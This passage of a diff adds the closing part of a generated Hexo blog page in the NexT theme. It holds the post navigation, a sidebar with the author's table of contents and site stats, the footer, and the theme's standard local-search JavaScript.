+                <i class="fa fa-chevron-left"></i> 一道简单的栈溢出题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/17/三个白帽/" rel="prev" title="三个白帽">
+                三个白帽 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-程序分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 程序分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mask</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
